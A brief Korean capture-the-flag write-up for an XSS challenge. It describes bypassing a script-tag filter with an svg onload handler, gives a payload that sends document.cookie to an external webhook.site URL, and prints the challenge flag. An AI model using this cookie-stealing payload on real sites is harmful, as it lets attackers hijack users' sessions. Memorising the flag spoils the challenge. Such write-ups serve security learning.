# XSS (Cross-site scripting)
사이트에 접속하면 vuln(xss) page와 flag 페이지가 나온다.

vuln(xss) page의 param이 
`<script>alert(1)</script>`으로 되어있는데 alert이 뜨지 않는 걸로 봐서 xss가 필터링 된 문제구나, 라고 생각하고 xss 우회법을 검색하여 `<svg/onload="alert(1)">`라고 적었는데 alert이 나오길래 이 코드를 이용하여 풀었다.

다만 소스를 보니 local에 있는 브라우저 cookie에 flag가 저장된다는 부분이 있었다.

그래서 flag 페이지를 이용해 로컬에서 외부 서버로 cookie 값을 전송해주는 코드를 넣어 solve 하였다.

## Code
```<svg/onload=location["href"]="https://webhook.site/webhook-id/?flag="+document["cookie"]>```

## Flag
flag{alert(/correct!/.source)}